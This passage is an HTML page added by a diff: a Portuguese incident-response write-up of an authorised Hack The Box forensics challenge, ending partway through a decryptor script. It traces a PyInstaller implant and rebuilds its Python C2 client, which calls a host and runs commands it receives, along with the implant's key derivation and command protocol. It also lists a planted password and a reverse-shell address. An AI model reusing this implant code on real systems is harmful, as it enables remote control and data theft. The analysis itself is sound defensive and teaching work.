@@ -1,0 +1,1234 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="dark">
+<title>The Ash-Binder Signature | Relatorio Forense</title>
+<style>
+  :root{
+    --ink:#dce8ec; --muted:#8fa6ae; --paper:#091116; --panel:#0e1a21; --panel-2:#13242c;
+    --line:rgba(154,196,207,.18); --cyan:#6de1e8; --cyan-soft:rgba(109,225,232,.12);
+    --amber:#ffb45f; --amber-soft:rgba(255,180,95,.12); --red:#ff716d; --red-soft:rgba(255,113,109,.12);
+    --green:#83d89c; --green-soft:rgba(131,216,156,.12); --violet:#bba8ff;
+    --shadow:0 22px 70px rgba(0,0,0,.3);
+    --sans:"Trebuchet MS","Gill Sans","Segoe UI",sans-serif;
+    --serif:"Palatino Linotype","Book Antiqua",Palatino,serif;
+    --mono:"Cascadia Code","JetBrains Mono","Fira Code",Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:28px}
+  body{
+    margin:0;color:var(--ink);
+    background:
+      linear-gradient(rgba(109,225,232,.035) 1px,transparent 1px),
+      linear-gradient(90deg,rgba(109,225,232,.035) 1px,transparent 1px),
+      radial-gradient(circle at 82% 5%,rgba(255,180,95,.11),transparent 25rem),
+      radial-gradient(circle at 10% 35%,rgba(109,225,232,.09),transparent 30rem),
+      var(--paper);
+    background-size:32px 32px,32px 32px,auto,auto,auto;
+    font-family:var(--sans);line-height:1.65;
+  }
+  a{color:var(--cyan);text-decoration:none}
+  a:hover{text-decoration:underline}
+  code{font-family:var(--mono)}
+  .layout{display:grid;grid-template-columns:290px minmax(0,1fr);min-height:100vh}
+  .sidebar{position:sticky;top:0;height:100vh;padding:34px 24px;border-right:1px solid var(--line);
+    background:rgba(7,15,20,.92);backdrop-filter:blur(18px);overflow-y:auto;z-index:10}
+  .brand{display:flex;gap:13px;align-items:center;margin-bottom:32px}
+  .brand-mark{display:grid;place-items:center;width:42px;height:42px;border:1px solid var(--cyan);
+    color:var(--cyan);font-family:var(--mono);font-weight:800;box-shadow:0 0 24px rgba(109,225,232,.16)}
+  .brand strong{display:block;letter-spacing:.12em;text-transform:uppercase}
+  .brand small{color:var(--muted);letter-spacing:.05em}
+  .nav-label{margin:24px 10px 8px;color:var(--muted);font-family:var(--mono);font-size:.68rem;
+    letter-spacing:.16em;text-transform:uppercase}
+  nav a{display:flex;gap:11px;align-items:center;padding:9px 10px;border-left:2px solid transparent;
+    color:#b8c9ce;font-size:.89rem;transition:160ms ease}
+  nav a:hover,nav a.active{border-left-color:var(--cyan);color:#fff;background:var(--cyan-soft);
+    text-decoration:none;transform:translateX(2px)}
+  nav .num{color:var(--cyan);font-family:var(--mono);font-size:.7rem}
+  .side-note{margin-top:30px;padding:14px;border:1px solid var(--line);color:var(--muted);
+    background:rgba(255,255,255,.025);font-size:.76rem}
+  main{width:min(1180px,100%);padding:52px 54px 100px}
+  .hero{position:relative;padding:54px;overflow:hidden;border:1px solid var(--line);
+    background:linear-gradient(135deg,var(--panel-2),var(--panel));box-shadow:var(--shadow)}
+  .hero::after{content:"";position:absolute;inset:auto -80px -120px auto;width:340px;height:340px;
+    border-radius:50%;background:radial-gradient(circle,rgba(109,225,232,.18),transparent 70%)}
+  .eyebrow{color:var(--amber);font-family:var(--mono);font-size:.72rem;letter-spacing:.22em;
+    text-transform:uppercase}
+  .hero h1{margin:14px 0 10px;font-family:var(--serif);font-size:2.5rem;line-height:1.15}
+  .lede{max-width:70ch;color:var(--muted);font-size:1.02rem}
+  .hero-meta{display:flex;flex-wrap:wrap;gap:10px;margin-top:26px;position:relative;z-index:1}
+  .tag{padding:5px 12px;border:1px solid var(--line);color:var(--muted);background:rgba(255,255,255,.03);
+    font-family:var(--mono);font-size:.73rem}
+  .tag.on{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-soft)}
+  section{margin-top:64px}
+  .section-head{display:flex;gap:16px;align-items:baseline;padding-bottom:12px;margin-bottom:26px;
+    border-bottom:1px solid var(--line)}
+  .section-index{color:var(--cyan);font-family:var(--mono);font-size:.8rem}
+  .section-head h2{margin:0;font-family:var(--serif);font-size:1.55rem;letter-spacing:.01em}
+  .grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:18px}
+  .grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px}
+  .card{padding:20px;border:1px solid var(--line);background:var(--panel);box-shadow:var(--shadow)}
+  .card .label{color:var(--muted);font-family:var(--mono);font-size:.7rem;letter-spacing:.14em;
+    text-transform:uppercase}
+  .card .value{margin-top:6px;font-family:var(--mono);font-size:1.02rem;color:#fff;word-break:break-all}
+  .flag-grid{display:grid;gap:16px}
+  .flag-card{display:grid;grid-template-columns:56px minmax(0,1fr);gap:18px;padding:22px;
+    border:1px solid var(--line);border-left:3px solid var(--cyan);background:var(--panel);
+    box-shadow:var(--shadow)}
+  .flag-card .num{display:grid;place-items:center;width:44px;height:44px;border:1px solid var(--cyan);
+    color:var(--cyan);font-family:var(--mono);font-weight:700}
+  .flag-card h3{margin:0 0 6px;font-size:1rem;font-weight:600;color:#e8f3f6}
+  .flag-card .q{color:var(--muted);font-size:.88rem;margin:0 0 14px}
+  .answer{display:inline-block;padding:9px 14px;border:1px solid var(--green);color:#d8ffe6;
+    background:var(--green-soft);font-family:var(--mono);font-size:.95rem;word-break:break-all}
+  .answer.fix{border-color:var(--amber);color:#ffe8cb;background:var(--amber-soft)}
+  .alts{margin:12px 0 0;padding:12px 14px;border:1px dashed var(--line);background:rgba(255,255,255,.02)}
+  .alts .label{color:var(--muted);font-family:var(--mono);font-size:.68rem;letter-spacing:.14em;
+    text-transform:uppercase}
+  .alts ol{margin:8px 0 0;padding-left:20px}
+  .alts li{font-family:var(--mono);font-size:.8rem;color:#c3d6db;word-break:break-all;margin-bottom:4px}
+  .why{margin:14px 0 0;color:var(--muted);font-size:.85rem}
+  .why b{color:var(--amber);font-weight:600}
+  .step{margin:0 0 34px;padding:22px 24px;border:1px solid var(--line);border-left:3px solid var(--amber);
+    background:linear-gradient(180deg,rgba(255,255,255,.022),transparent);box-shadow:var(--shadow)}
+  .step-head{display:flex;gap:14px;align-items:baseline;margin-bottom:4px}
+  .step-n{flex:none;padding:2px 9px;border:1px solid var(--amber);color:var(--amber);
+    font-family:var(--mono);font-size:.72rem;letter-spacing:.1em}
+  .step-head h3{margin:0;font-size:1rem;font-weight:600;color:#e8f3f6}
+  .step .q{margin:2px 0 0;color:var(--muted);font-size:.85rem;font-style:italic}
+  .resp{display:flex;gap:14px;align-items:center;flex-wrap:wrap;margin-top:4px;padding:12px 14px;
+    border:1px solid var(--green);border-left:3px solid var(--green);background:var(--green-soft)}
+  .resp-label{color:var(--green);font-family:var(--mono);font-size:.68rem;letter-spacing:.16em;
+    text-transform:uppercase;flex:none}
+  .resp .val{font-family:var(--mono);font-size:.98rem;color:#e6fff0;word-break:break-all}
+  .code-shell{margin:18px 0;border:1px solid var(--line);background:#060d11;box-shadow:var(--shadow)}
+  .code-head{display:flex;justify-content:space-between;align-items:center;padding:9px 14px;
+    border-bottom:1px solid var(--line);color:var(--muted);font-family:var(--mono);font-size:.72rem;
+    letter-spacing:.12em;text-transform:uppercase;background:rgba(255,255,255,.02)}
+  pre{margin:0;padding:16px 18px;overflow-x:auto;font-family:var(--mono);font-size:.83rem;line-height:1.55;
+    color:#cfe4e9}
+  pre .c{color:var(--cyan)}
+  pre .a{color:var(--amber)}
+  pre .g{color:var(--green)}
+  pre .r{color:var(--red)}
+  pre .m{color:#5f7681}
+  .timeline{position:relative;margin-top:10px;padding-left:26px}
+  .timeline::before{content:"";position:absolute;top:6px;bottom:6px;left:7px;width:1px;background:var(--line)}
+  .timeline-item{position:relative;padding:0 0 22px 8px}
+  .timeline-item::before{content:"";position:absolute;left:-23px;top:8px;width:9px;height:9px;
+    border:1px solid var(--cyan);background:var(--paper);border-radius:50%}
+  .timeline-item.hot::before{border-color:var(--red);background:var(--red)}
+  .timeline-item time{color:var(--cyan);font-family:var(--mono);font-size:.76rem}
+  .timeline-item strong{display:block;margin:2px 0 2px;font-weight:600}
+  .timeline-item p{margin:0;color:var(--muted);font-size:.86rem}
+  .callout{margin:22px 0;padding:18px 20px;border:1px solid var(--line);border-left:3px solid var(--amber);
+    background:var(--amber-soft)}
+  .callout.danger{border-left-color:var(--red);background:var(--red-soft)}
+  .callout.info{border-left-color:var(--cyan);background:var(--cyan-soft)}
+  .callout h4{margin:0 0 6px;font-size:.95rem;letter-spacing:.02em}
+  .callout p{margin:0;color:var(--muted);font-size:.88rem}
+  table{width:100%;border-collapse:collapse;margin-top:8px;font-size:.86rem}
+  th,td{padding:10px 12px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+  th{color:var(--muted);font-family:var(--mono);font-size:.7rem;letter-spacing:.14em;text-transform:uppercase}
+  td.mono{font-family:var(--mono);font-size:.82rem;word-break:break-all}
+  .table-wrap{overflow-x:auto}
+  .chain{display:grid;gap:10px;margin-top:8px}
+  .path-node{display:flex;gap:12px;align-items:flex-start;padding:12px 14px;border:1px solid var(--line);
+    background:var(--panel);font-family:var(--mono);font-size:.82rem;word-break:break-all}
+  .path-node .depth{color:var(--amber);flex:none}
+  .path-node.deep{border-color:var(--amber);background:var(--amber-soft)}
+  footer{margin-top:70px;padding-top:22px;border-top:1px solid var(--line);color:var(--muted);
+    font-size:.78rem;font-family:var(--mono)}
+  @media (max-width:900px){
+    .layout{grid-template-columns:1fr}
+    .sidebar{position:static;height:auto}
+    main{padding:34px 22px 70px}
+    .hero{padding:32px}
+    .hero h1{font-size:1.9rem}
+    .flag-card{grid-template-columns:1fr}
+  }
+</style>
+</head>
+<body>
+<div class="layout">
+
+  <aside class="sidebar">
+    <div class="brand">
+      <div class="brand-mark">AB</div>
+      <div>
+        <strong>Ash-Binder</strong>
+        <small>DFIR &middot; ash-wbsrv03</small>
+      </div>
+    </div>
+
+    <div class="nav-label">Relatorio</div>
+    <nav>
+      <a href="#sumario"><span class="num">00</span> Sumario executivo</a>
+      <a href="#aquisicao"><span class="num">01</span> Aquisicao &amp; artefatos</a>
+      <a href="#triagem"><span class="num">02</span> Triagem do host</a>
+      <a href="#reversing"><span class="num">03</span> Reversing do implante</a>
+      <a href="#cripto"><span class="num">04</span> Quebra da cripto C2</a>
+      <a href="#sessao"><span class="num">05</span> Sessao decriptada</a>
+      <a href="#comandos"><span class="num">06</span> Comando &rarr; resposta</a>
+      <a href="#flags"><span class="num">07</span> Respostas (11 flags)</a>
+      <a href="#linha"><span class="num">08</span> Linha do tempo</a>
+      <a href="#iocs"><span class="num">09</span> IOCs</a>
+      <a href="#impacto"><span class="num">10</span> Impacto &amp; resposta</a>
+    </nav>
+
+    <div class="side-note">
+      <strong style="color:var(--cyan)">Escopo</strong><br>
+      CTF autorizado (HTB). Analise conduzida offline sobre copia dos artefatos,
+      sem execucao do binario malicioso.
+    </div>
+  </aside>
+
+  <main>
+
+    <div class="hero">
+      <div class="eyebrow">Relatorio de resposta a incidente &middot; Elowen Ashglass</div>
+      <h1>The Ash-Binder Signature</h1>
+      <p class="lede">
+        Um servidor web do perimetro interno (<code>ash-wbsrv03</code>, 10.10.0.10) foi comprometido
+        por um implante Python empacotado com PyInstaller que fala um protocolo C2 proprietario
+        sobre a porta 443 &mdash; sem TLS, mas com AES-256-CBC e HMAC caseiro. Todo o trafego foi
+        recuperado do <code>capture.pcap</code>, decriptado e reconstruido comando a comando:
+        exfiltracao de configuracao, plantio de chave SSH, criacao de conta de persistencia e
+        gravacao de um reverse shell dormente. As 11 flags estao respondidas na secao 06.
+      </p>
+      <div class="hero-meta">
+        <span class="tag on">11/11 flags</span>
+        <span class="tag">uac-ash-wbsrv03-linux-20260522185435.tar.gz</span>
+        <span class="tag">capture.pcap</span>
+        <span class="tag">2026-05-22</span>
+        <span class="tag">Linux / Debian 13</span>
+      </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <section id="sumario">
+      <div class="section-head"><span class="section-index">00</span><h2>Sumario executivo</h2></div>
+
+      <p class="lede">
+        O atacante entrou por SSH valido a partir de <b>10.10.0.56</b>, usando a conta
+        <code>kingmaelor</code> &mdash; um usuario com <code>sudo</code> irrestrito e, pior,
+        regras <code>NOPASSWD</code> especificas para <code>useradd</code>, <code>usermod</code> e
+        <code>chpasswd</code>. Dessa sessao ele lancou o binario <code>/srv/AshShare/linux_sys_updater</code>,
+        que abriu um canal C2 criptografado para 10.10.0.56:443.
+      </p>
+
+      <div class="grid-3">
+        <div class="card"><div class="label">Vetor de acesso</div><div class="value">SSH valido<br>10.10.0.56 &rarr; :22</div></div>
+        <div class="card"><div class="label">Conta abusada</div><div class="value">kingmaelor:crownspire</div></div>
+        <div class="card"><div class="label">Implante</div><div class="value">/srv/AshShare/<br>linux_sys_updater</div></div>
+        <div class="card"><div class="label">C2</div><div class="value">10.10.0.56:443<br>AES-256-CBC + SHA256</div></div>
+        <div class="card"><div class="label">Conta plantada</div><div class="value">backup_usr<br>9cq3jPVN6Me1</div></div>
+        <div class="card"><div class="label">Reverse shell dormente</div><div class="value">141.101.64.3:53</div></div>
+      </div>
+
+      <div class="callout danger">
+        <h4>Conclusao da analise</h4>
+        <p>
+          O incidente tem assinatura de <b>extracao controlada</b>, nao de raide oportunista:
+          nenhuma destruicao, nenhum ransomware, nenhum ruido. O operador coletou material de
+          configuracao, garantiu tres caminhos independentes de retorno (chave SSH, conta local com
+          senha, reverse shell em arquivo oculto) e encerrou a sessao. Exatamente o padrao descrito
+          por Elowen: cinzas estrangeiras, passos medidos, nada quebrado.
+        </p>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="aquisicao">
+      <div class="section-head"><span class="section-index">01</span><h2>Aquisicao &amp; artefatos</h2></div>
+
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>Artefato</th><th>Tipo</th><th>Observacao</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="mono">uac-ash-wbsrv03-linux-20260522185435.tar.gz</td>
+            <td>Coleta UAC (ir_triage)</td>
+            <td>Triagem ao vivo executada em 2026-05-22 18:54:35 UTC &mdash; <b>durante</b> a intrusao</td>
+          </tr>
+          <tr>
+            <td class="mono">capture.pcap</td>
+            <td>Captura de rede</td>
+            <td>2 fluxos TCP: SSH (stream 0) e C2 na 443 (stream 1)</td>
+          </tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="code-shell">
+        <div class="code-head"><span>Preparacao</span><span>bash</span></div>
+<pre><span class="m"># extrair a coleta UAC</span>
+<span class="c">mkdir</span> -p uac &amp;&amp; <span class="c">tar</span> -xzf uac-ash-wbsrv03-linux-20260522185435.tar.gz -C uac
+
+<span class="m"># conversas TCP presentes na captura</span>
+<span class="c">tshark</span> -r capture.pcap -q -z conv,tcp
+
+10.10.0.56:53470 &lt;-&gt; 10.10.0.10:22    458 frames    53 kB   <span class="m"># SSH</span>
+10.10.0.10:49892 &lt;-&gt; 10.10.0.56:443    56 frames    26 kB   <span class="a"># C2 (sem TLS!)</span>
+</pre>
+      </div>
+
+      <p class="why">
+        <b>Primeiro sinal:</b> o fluxo para a porta 443 nao comeca com um ClientHello TLS. Sao blocos
+        Base64 precedidos de um prefixo binario de 4 bytes &mdash; protocolo proprietario disfarcado
+        de HTTPS.
+      </p>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="triagem">
+      <div class="section-head"><span class="section-index">02</span><h2>Triagem do host &mdash; quem, o que, para onde</h2></div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">2.1</span><h3>Arvore de processos</h3></div>
+        <p class="q">Ha algum processo pendurado numa sessao SSH que nao deveria estar ali?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>uac/live_response/process/ps_auxwwwf.txt</span><span>saida</span></div>
+<pre>root      8   sshd: /usr/sbin/sshd -D [listener]
+root      86   \_ sshd-session: kingmaelor [priv]
+kingmae+  94       \_ sshd-session: kingmaelor@pts/1
+kingmae+  95           \_ -bash
+kingmae+  99               \_ <span class="a">/srv/AshShare/linux_sys_updater</span>
+kingmae+  100                   \_ <span class="a">/srv/AshShare/linux_sys_updater</span>   <span class="m"># fork PyInstaller</span>
+</pre>
+        </div>
+        <p class="why">
+          O <code>pstree</code> mostra o nome truncado <code>linux_sys_updat</code> (limite de 15 chars do
+          <code>comm</code>), tipico de binario PyInstaller que renomeia o processo filho.
+        </p>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">2.2</span><h3>Conexoes de rede</h3></div>
+        <div class="code-shell">
+          <div class="code-head"><span>uac/live_response/network/netstat_-anp.txt</span><span>saida</span></div>
+<pre>tcp  0  0  10.10.0.10:49892   <span class="a">10.10.0.56:443</span>    ESTABLISHED   <span class="m"># canal C2</span>
+tcp  0  0  10.10.0.10:22      <span class="a">10.10.0.56:53470</span>  ESTABLISHED   <span class="m"># sessao SSH do atacante</span>
+</pre>
+        </div>
+        <p class="why">
+          Mesmo IP de origem para o SSH e destino do C2: <b>10.10.0.56</b> e a maquina do operador.
+          Os dois fluxos do pcap batem exatamente com estes sockets.
+        </p>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">2.3</span><h3>Identidade do usuario comprometido</h3></div>
+        <p class="q">Qual conta e qual e o grupo primario dela?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>uac/[root]/etc/passwd + /etc/group</span><span>correlacao</span></div>
+<pre><span class="m"># /etc/passwd</span>
+kingmaelor:x:<span class="c">1005</span>:<span class="a">1011</span>::/home/kingmaelor:/bin/bash
+<span class="m">#              uid      gid(primario)</span>
+
+<span class="m"># /etc/group &mdash; qual grupo tem GID 1011?</span>
+<span class="a">crownspire</span>:x:<span class="a">1011</span>:lysaharrowmere,caldrinvowmark,rinkagetsura,keirunderbelly
+sudo:x:27:<span class="c">kingmaelor</span>                      <span class="m"># e ainda membro de sudo</span>
+</pre>
+        </div>
+        <div class="resp"><span class="resp-label">Confirmado em runtime</span>
+          <span class="val">uid=1005(kingmaelor) gid=1011(crownspire) groups=1011(crownspire),27(sudo)</span></div>
+        <p class="why">
+          O <code>id</code> executado pelo proprio atacante via C2 (mensagem 18 da sessao) confirma
+          a leitura estatica: grupo primario <b>crownspire</b>, nao <code>sudo</code>.
+        </p>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">2.4</span><h3>O binario implantado</h3></div>
+        <div class="code-shell">
+          <div class="code-head"><span>identificacao do arquivo</span><span>bash</span></div>
+<pre><span class="c">file</span> '[root]/srv/AshShare/linux_sys_updater'
+ELF 64-bit LSB executable, x86-64, dynamically linked, <span class="a">stripped</span>, 9.258.320 bytes
+
+<span class="c">md5sum</span>   e1349e5c012ad89a1e543d1d6236004d
+<span class="c">sha256sum</span> 74c2ebe9ee25ade9c9d7459278cab19c389a8963a4a477ac56f04b273c14f6d0
+
+<span class="m"># bodyfile: mtime do arquivo no disco</span>
+/srv/AshShare/linux_sys_updater  9258320  <span class="a">mtime 2026-05-22 13:18:08 UTC</span>
+
+<span class="c">strings</span> linux_sys_updater | <span class="c">grep</span> -i pyinstaller
+<span class="a">Could not load PyInstaller's embedded PKG archive</span>
+libpython3.12.so.1.0            <span class="m"># &rarr; PyInstaller / CPython 3.12</span>
+</pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="reversing">
+      <div class="section-head"><span class="section-index">03</span><h2>Reversing do implante</h2></div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">3.1</span><h3>Extracao do arquivo CArchive</h3></div>
+        <p class="q">Como recuperar o codigo Python de dentro do ELF?</p>
+        <p class="why">
+          O executavel PyInstaller termina com um cookie magico <code>MEI\014\013\012\013\016</code> seguido
+          do offset da TOC. Escrevi um extrator minimo em vez de depender de ferramenta externa.
+        </p>
+        <div class="code-shell">
+          <div class="code-head"><span>extract_pyi.py (trecho)</span><span>python</span></div>
+<pre>MAGIC = b<span class="g">'MEI\014\013\012\013\016'</span>
+pos = data.rfind(MAGIC)
+magic, lengthofPackage, toc_off, tocLen, pyver = struct.unpack(<span class="g">'!8sIIII'</span>, cookie[:24])
+<span class="m"># entradas da TOC: entryPos, cmprsdSize, uncmprsdSize, cmprsFlag, type, name</span>
+<span class="c">if</span> flag: raw = zlib.decompress(raw)
+</pre>
+        </div>
+        <div class="code-shell">
+          <div class="code-head"><span>resultado</span><span>96 entradas</span></div>
+<pre>pyver=312   pylib=libpython3.12.so.1.0
+  s <span class="a">client</span>            (9246 bytes)   <span class="m">&larr; script principal, bytecode 3.12 sem header</span>
+  z PYZ.pyz          (1494042)
+  x base_library.zip (1332793)
+  Crypto/...                        <span class="m">&larr; pycryptodome embarcado</span>
+</pre>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">3.2</span><h3>Desmontagem do bytecode 3.12</h3></div>
+        <p class="q">A estacao de analise roda Python 3.13. Como ler bytecode 3.12?</p>
+        <p class="why">
+          <code>marshal.loads()</code> do 3.13 le o objeto de codigo (constantes e nomes ficam legiveis),
+          mas a <b>numeracao de opcodes mudou</b> entre 3.12 e 3.13 &mdash; desmontar com o <code>dis</code>
+          nativo produziria instrucoes erradas. Solucao: reconstruir um <code>.pyc</code> valido com o magic
+          number do 3.12 (3531) e desmontar com <code>xdis</code>, que carrega a tabela de opcodes correta.
+        </p>
+        <div class="code-shell">
+          <div class="code-head"><span>reconstrucao do .pyc + disassembly</span><span>python / bash</span></div>
+<pre><span class="m"># header pyc = magic(2) + b'\r\n' + flags(4) + mtime(4) + size(4) = 16 bytes</span>
+open(<span class="g">'client.pyc'</span>,<span class="g">'wb'</span>).write(struct.pack(<span class="g">'&lt;H'</span>,<span class="c">3531</span>) + b<span class="g">'\r\n'</span> + b<span class="g">'\x00'</span>*<span class="c">12</span> + data)
+
+$ pydisasm client.pyc
+<span class="g"># CPython Python bytecode 3.12.0 (3531)</span>
+</pre>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">3.3</span><h3>Ofuscacao: nomes lixo + strings XOR</h3></div>
+        <p class="why">
+          Todas as funcoes e variaveis foram renomeadas para tokens aleatorios (<code>Sw1vE2</code>,
+          <code>Ru8wD1</code>, <code>Kd3uD9</code>...). As strings de protocolo estao em Base64 sobre
+          um XOR duplo. A funcao <code>Jn2bM4</code> e o deobfuscador:
+        </p>
+        <div class="code-shell">
+          <div class="code-head"><span>Jn2bM4() &mdash; deobfuscador reconstruido</span><span>python</span></div>
+<pre><span class="c">def</span> <span class="a">Jn2bM4</span>(s):                       <span class="m"># constantes: 4, '=', 85, 170, 'utf-8'</span>
+    s = s + <span class="g">'='</span> * (-len(s) % <span class="c">4</span>)          <span class="m"># repadding base64</span>
+    <span class="c">return</span> bytes(b ^ <span class="a">85</span> ^ <span class="a">170</span> <span class="c">for</span> b <span class="c">in</span> base64.b64decode(s)).decode(<span class="g">'utf-8'</span>)
+                    <span class="m"># 85 ^ 170 = 255  &rarr;  e apenas NOT byte-a-byte</span>
+</pre>
+        </div>
+        <div class="code-shell">
+          <div class="code-head"><span>tabela de comandos recuperada</span><span>saida</span></div>
+<pre>vqy3oLyztqA=              &rarr; <span class="a">ASH_CLI_</span>
+vbq+vLCx34TPgt+EzoI=      &rarr; BEACON {0} {1}
+vLe+s7O6sbi6              &rarr; CHALLENGE
+vLe+s7O6sbi6oK26rK+wsay6  &rarr; CHALLENGE_RESPONSE
+u6ixs6C5trO63w==          &rarr; <span class="a">DWNL_FILE </span>       <span class="m"># C2 pede arquivo &rarr; exfiltracao</span>
+u6ixs6C7vqu+34TPgg==      &rarr; DWNL_DATA {0}
+u6ixs6CxsKugubCqsbs=      &rarr; DWNL_NOT_FOUND
+qq+zu6C5trO63w==          &rarr; <span class="a">UPLD_FILE </span>       <span class="m"># C2 envia arquivo &rarr; grava no host</span>
+qq+zu6C7vqu+3w==          &rarr; UPLD_DATA
+qq+zu6C+vLQ=              &rarr; UPLD_ACK
+qq+zu6C5vraz              &rarr; UPLD_FAIL
+vLK73w==                  &rarr; <span class="a">CMD </span>
+sKqrr6qr34TPgt+EzoI=      &rarr; OUTPUT {0} {1}
+rLeqq7uwqLE=              &rarr; SHUTDOWN
+t7K+vN+Jmo2WmZacnouWkJHf... &rarr; HMAC verification failed
+</pre>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">3.4</span><h3>Codigo reconstruido (client.py)</h3></div>
+        <div class="code-shell">
+          <div class="code-head"><span>client.py &mdash; reconstrucao a partir do disassembly</span><span>python</span></div>
+<pre><span class="a">X7wR9t</span> = <span class="g">'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'</span>          <span class="m"># SEMENTE (linha 14), nao a chave AES</span>
+
+<span class="c">def</span> <span class="a">Fg3hY6</span>(Ab4cD2):                                  <span class="m"># derivacao de chaves</span>
+    Mn7kL1 = hashlib.sha256(Ab4cD2.encode()).digest()
+    Rt9wZ3 = hashlib.sha256(Mn7kL1 + b<span class="g">'encryption'</span>).digest()[:<span class="c">32</span>]
+    Yt5xP8 = hashlib.sha256(Mn7kL1 + b<span class="g">'hmac'</span>).digest()[:<span class="c">32</span>]
+    <span class="c">return</span> Rt9wZ3, Yt5xP8
+
+<span class="a">Pq2mN5</span>, <span class="a">Zk8vL4</span> = Fg3hY6(X7wR9t)                       <span class="m"># &larr; Pq2mN5 E a chave AES real</span>
+
+<span class="c">def</span> <span class="a">Qw6rT1</span>(Bn9mS4):                                  <span class="m"># encrypt()</span>
+    Vc5xZ8 = get_random_bytes(<span class="c">16</span>)                      <span class="m"># IV</span>
+    Mg7uB6 = AES.new(Pq2mN5, AES.MODE_CBC, Vc5xZ8).encrypt(pad(data, <span class="c">16</span>))
+    Lt4vC9 = hashlib.new(<span class="g">'sha256'</span>, Zk8vL4 + Vc5xZ8 + Mg7uB6).digest()
+    <span class="c">return</span> base64.b64encode(Vc5xZ8 + Mg7uB6 + Lt4vC9)   <span class="m"># IV || CT || MAC</span>
+
+<span class="c">def</span> <span class="a">Ru8wD1</span>(Fy2jE5):                                  <span class="m"># decrypt()</span>
+    Kp6tF3 = base64.b64decode(Fy2jE5)
+    Sr4xG7, Zt9yH2, Wq1zI8 = Kp6tF3[:<span class="c">16</span>], Kp6tF3[<span class="c">16</span>:<span class="c">-32</span>], Kp6tF3[<span class="c">-32</span>:]
+    <span class="c">if</span> Wq1zI8 != hashlib.new(<span class="g">'sha256'</span>, Zk8vL4 + Sr4xG7 + Zt9yH2).digest():
+        <span class="c">raise</span> ValueError(<span class="g">'HMAC verification failed'</span>)
+    <span class="c">return</span> unpad(AES.new(Pq2mN5, AES.MODE_CBC, Sr4xG7).decrypt(Zt9yH2), <span class="c">16</span>).decode()
+
+<span class="c">def</span> <span class="a">Jl9eN3</span>(sock, msg):                               <span class="m"># send: prefixo big-endian de 4 bytes</span>
+    blob = Qw6rT1(msg); sock.sendall(struct.pack(<span class="g">'&gt;I'</span>, len(blob)) + blob)
+
+<span class="c">def</span> <span class="a">Ve8sB7</span>(Hj5tC1):                                  <span class="m"># executor de comandos</span>
+    <span class="c">try</span>:
+        <span class="a">Kd3uD9</span> = subprocess.check_output(Hj5tC1, shell=<span class="c">True</span>,
+                                        stderr=subprocess.STDOUT, timeout=<span class="c">10</span>)
+        <span class="c">return</span> <span class="a">Kd3uD9</span>.decode()          <span class="m">&lt;&mdash; variavel que guarda a saida</span>
+    <span class="c">except</span>: <span class="c">return</span> <span class="g">'Failed'</span>
+
+<span class="c">def</span> <span class="a">Sw1vE2</span>():                                       <span class="m"># laco principal</span>
+    Mn9wF6, Gt4xG3, Rz2zI1 = <span class="g">'10.10.0.56'</span>, <span class="c">443</span>, <span class="c">30</span>
+    Lp7yH8 = <span class="a">Jn2bM4('vqy3oLyztqA=')</span> + <span class="g">''</span>.join(
+                 chr(random.randint(<span class="c">97</span>,<span class="c">122</span>)) <span class="c">for</span> _ <span class="c">in</span> range(<span class="c">20</span>))
+    <span class="m"># &rarr; client_id = 'ASH_CLI_' + 20 letras minusculas aleatorias</span>
+    ...
+</pre>
+        </div>
+        <div class="resp"><span class="resp-label">client id observado</span>
+          <span class="val">ASH_CLI_nxpgkxxdatxrcbvkeqby</span></div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="cripto">
+      <div class="section-head"><span class="section-index">04</span><h2>Quebra da cripto do C2</h2></div>
+
+      <p class="lede">
+        Com as chaves derivadas do binario, o fluxo TCP 1 se torna texto claro. O detalhe que
+        derruba a primeira tentativa: a chave <b>nao</b> e usada diretamente &mdash; ela passa por um
+        SHA-256 <b>antes</b> de receber os sais <code>encryption</code> e <code>hmac</code>.
+      </p>
+
+      <div class="callout info">
+        <h4>Armadilha da derivacao</h4>
+        <p>
+          Tentar <code>sha256(chave + b'encryption')</code> resulta em "Padding is incorrect" em toda mensagem.
+          O disassembly da linha 17 mostra <code>Mn7kL1 = sha256(chave.encode()).digest()</code> como
+          <b>primeiro</b> passo; os sais sao concatenados a esse digest, nao a chave.
+        </p>
+      </div>
+
+      <div class="code-shell">
+        <div class="code-head"><span>dec2.py &mdash; decriptador da sessao</span><span>python</span></div>
+<pre>KEY = <span class="g">'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'</span>
+h   = hashlib.sha256(KEY.encode()).digest()
+ENC = hashlib.sha256(h + b<span class="g">'encryption'</span>).digest()[:<span class="c">32</span>]
+MAC = hashlib.sha256(h + b<span class="g">'hmac'</span>).digest()[:<span class="c">32</span>]
+
+<span class="c">def</span> decrypt(blob):
+    raw = base64.b64decode(blob)
